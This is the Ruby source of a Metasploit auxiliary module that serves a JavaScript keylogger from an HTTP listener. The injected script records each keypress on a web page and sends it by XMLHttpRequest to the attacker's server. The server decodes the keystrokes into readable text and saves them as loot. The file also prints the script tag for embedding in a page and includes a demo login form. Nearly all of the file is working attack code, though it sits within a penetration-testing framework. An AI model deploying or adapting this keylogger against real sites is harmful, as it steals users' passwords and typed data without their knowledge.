##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Man-in-the-middle JavaScript Keylogger',
			'Description'    => %q{
				This modules runs a HTTP Server to serve as a remote keylog listener
				to capture web page keystrokes.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Marcus J. Carey <mjc[at]threatagent.com>']
	))

	register_options(
		[
			OptString.new('SRVHOST', [true, "Local HTTP Server IP Address", "#{Rex::Socket.source_address}"]),
			OptInt.new('SRVPORT', [true, "Local HTTP Server Port",80]),
			OptBool.new('DEMO', [true, "Create a Demo Keylogger Page",false]),
			OptString.new('URIPATH', [true, "Recommended value is \"\/\"","/"])
		], self.class)
	end

	# This is the Demo Form Page <HTML>
	def demo
		html = <<EOS
<html>
<head>
<title>Metasploit JavaScript Keylogger Demonstration Form</title>
<script type="text/javascript" src="#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@random_text}.js"></script>
</head>
<body bgcolor="white">
<br><br>
<div align="center">
<h1>Metasploit<br>Javascript Keylogger Demo</h1>
<form method=\"POST\" name=\"logonf\" action=\"#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/metasploit\">
<p><font color="red"><i>This form submits data to the Metasploit listener <br>at #{datastore['SRVHOST']}:#{datastore['SRVPORT']} for demonstration purposes.</i></font>
<br><br>
<table border="0" cellspacing="0" cellpadding="0">
<tr><td>Username:</td> <td><input name="userf" size="20"></td> </tr>
<tr><td>Password:</td> <td><input type="password" name="passwordf" size="20"></td> </tr>
</table>
<p align="center"><input type="submit" value="Submit"></p></form>
<p><font color="grey" size="2">Metasploit&reg; is a registered trademark of Rapid7, Inc.</font>
</div>
</body>
</html>
EOS
		return html
	end

	# This is the JavaScript Key Logger Code
	def keylogger
		code = <<EOS
window.onload = function load#{@random_text}(){
	l#{@random_text} = ",";
	document.onkeypress = p#{@random_text};
	document.onkeydown = d#{@random_text};
}
function p#{@random_text}(e){
	k#{@random_text} = window.event.keyCode;
	k#{@random_text} = k#{@random_text}.toString(16);
	if (k#{@random_text} != "d"){
		#{@random_text}(k#{@random_text});
	}
}
function d#{@random_text}(e){
	k#{@random_text} = window.event.keyCode;
	if (k#{@random_text} == 9 || k#{@random_text} == 8 || k#{@random_text} == 13){
		#{@random_text}(k#{@random_text});
	}
}
function #{@random_text}(k#{@random_text}){
	l#{@random_text} = l#{@random_text} + k#{@random_text} + ",";
	if (window.XMLHttpRequest){
		xmlhttp=new XMLHttpRequest();
	}
	else{
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp=new XMLHttpRequest();
	xmlhttp.open("GET","#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{@random_text}&[" + l#{@random_text} + "]",true);
	xmlhttp.send();
}
EOS
		return code
	end

	def hex_to_s(log)
		@ascii_log = ""
		log.split(",").each do |char|
			case char.to_i
			# Do Backspace
			when 8
				if @ascii_log.present?
					if @ascii_log[@ascii_log.length - 4,@ascii_log.length] == "<CR>"
						@ascii_log = @ascii_log[0, @ascii_log.length - 4]
					elsif @ascii_log[@ascii_log.length - 5,@ascii_log.length] == "<TAB>"
						@ascii_log = @ascii_log[0, @ascii_log.length - 5]
					else
						@ascii_log = @ascii_log[0, @ascii_log.length - 1]
					end
				end

			when 9  then @ascii_log += "<TAB>"
			when 13 then @ascii_log += "<CR>"

			else
				@ascii_log += char.to_s.hex.chr
			end
		end
	end

	# Creates Metasploit shield favicon
	def favicon
		# [Red/Green/Blue/Reserved] * 256
		data_rgb  = "00000000c5bdb50055341100ffffff002d1803006034060"
		data_rgb << "044250400673807004b290500d9d9d9004d2a0500251504"
		data_rgb << "00"*977
		data_rgb = [data_rgb].pack('H*')

		data_lines =  "0000000000000007070000000000000000000000000007"
		data_lines << "07070A00000000000000000000000707070A0A0A000000"
		data_lines << "000000000000070707070A0A0A0A000000000000000703"
		data_lines << "0707070A0A0A010A00000000000707030707070A0A0A09"
		data_lines << "020A00000000070303070703090A0A09090A0000000007"
		data_lines << "0303070703090A0A09090A000000000703030705030908"
		data_lines << "0A09090A0000000007030307070309040609090A000000"
		data_lines << "0007030307030309090B09090A00000000070303030303"
		data_lines << "09090909090A000000000703030303070A090909090A00"
		data_lines << "0000000703030307070A0A0909090A0000000007070707"
		data_lines << "07070A0A0A0A0A0A000000000007070707070A0A0A0A0A"
		data_lines << "000000"
		data_lines = [data_lines].pack('H*')

		data_mask =  "FE7F0000FC3F0000F81F0000F00F0000E0070000C0030000"
		data_mask << "C0030000C0030000C0030000C0030000C0030000C0030000"
		data_mask << "C0030000C0030000C0030000E0070000"
		data_mask = [data_mask].pack('H*')

		# icondir
		ico  = "\x00\x00"         # Reserved
		ico << "\x01\x00"         # Type
		ico << "\x01\x00"         # Count
		ico << "\x10"             # Width
		ico << "\x10"             # Height
		ico << "\x00"             # ColorCount
		ico << "\x00"             # Reserved
		ico << "\x00\x00"         # Planes
		ico << "\x00\x00"         # BitCount
		ico << "\x68\x05\x00\x00" # BytesInRes
		ico << "\x16\x00\x00\x00" # Image Offset
		# images: bmiHeader
		ico << "\x28\x00\x00\x00" # biSize
		ico << "\x10\x00\x00\x00" # biWidth
		ico << "\x20\x00\x00\x00" # biHeight
		ico << "\x01\x00"         # biPlanes
		ico << "\x08\x00"         # biBitcount
		ico << "\x00\x00\x00\x00" # biCompression
		ico << "\x00\x01\x00\x00" # biSizeImage
		ico << "\x00\x00\x00\x00" # XPelsPerMeter
		ico << "\x00\x00\x00\x00" # YPelsPerMeter
		ico << "\x00\x01\x00\x00" # biClrUsed
		ico << "\x00\x00\x00\x00" # ClrImportant
		# images: data
		ico << data_rgb
		ico << data_lines
		ico << data_mask

		return ico
	end

	def current_time
		return Time.new.utc.strftime("[%d/%b/%Y:%H:%M:%S %Z]")
	end

	# Creates and prints timestamp
	def request_timestamp(cli,request)
		print_status("#{cli.peerhost} - #{current_time} - [HTTP GET] - #{request.uri}")
	end

	# This handles the HTTP responses for the Web server
	def on_request_uri(cli, request)
		@host = cli.peerhost

		# Reply with JavaScript Source if *.js is requested
		if request.uri =~ /\.js/
			content_type = "text/plain"
			content = keylogger
			send_response(cli, content, {'Content-Type'=> content_type})
			request_timestamp(cli,request)

		# JavaScript XML HTTP GET Request is used for sending the keystrokes over network.
		elsif request.uri =~ /#{@random_text}/
			content_type = "text/plain"
			send_response(cli, @random_text, {'Content-Type'=> content_type})
			log = request.uri.split("&")[1]
			hex_to_s(log)
			@loot <<  "#{cli.peerhost} - #{current_time} - " + @ascii_log + "\n"
			if log.length > 1
				print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{@ascii_log}")
			end

		# Reply with Metasploit Shield Favicon
		elsif request.uri =~ /favicon\.ico/
			content = favicon
			content_type = "image/icon"
				send_response(cli, content, {'Content-Type'=> content_type})
			request_timestamp(cli,request)

		# Reply with Demo Page
		elsif request.uri =~ /metasploit/ and datastore['DEMO']
			content = demo
			content_type = "text/html"
				send_response(cli, content, {'Content-Type'=> content_type})
			request_timestamp(cli,request)
		else
			# Reply with 404 - Content Not Found
			content = "Error 404 (Not Found)!"
			send_response(cli, "<html><title>#{content}</title><h1>#{content}</h1></html>", {'Content-Type' => 'text/html'})
		end
	end

	def use_ssl?
		if datastore['SSL']
			@http_mode = "https://"
		else
			@http_mode = "http://"
		end
	end

	def start_log
		@loot = ""
		logo = %Q{
			# cowsay++
			 _________________________________
			< metasploit javascript keylogger >
			 ---------------------------------
			  \\   ,__,
			   \\  (oo)____
			      (__)    )\\
			        ||--|| *
			^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
			Started at #{current_time}
			=====================================

}
		logo = logo.gsub("\t\t\t","")

		@loot << logo

	end

	# This is the module's main runtime method
	def run
		start_log
		use_ssl?
		@ascii_log = ""
		@random_text = Rex::Text.rand_text_alpha(12)
		script_source = "#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/js#{@random_text}.js"

		# Prints Demo Page
		if datastore['DEMO']
			print_status("Demonstration Form URL => %grn#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/metasploit%clr")
		end

		# Prints HTML Embed Code
		print_status("Keylogger <HTML> Code => %blu<script type=\"text/javascript\" src=\"#{script_source}\"></script>%clr")
		print_status("Starting keylogger.  Please press [CTRl]+[C] if you wish to terminate.")

		# Starts Web Server
		begin
			exploit
		rescue Interrupt
			path = store_loot("javascript.keystrokes", "text/plain", @host, @loot)
			print_status("Stored loot at #{path}")
		end
	end
end

=begin
To-do:
1. Allow custom favicon
2. Allow custom demo page
=end
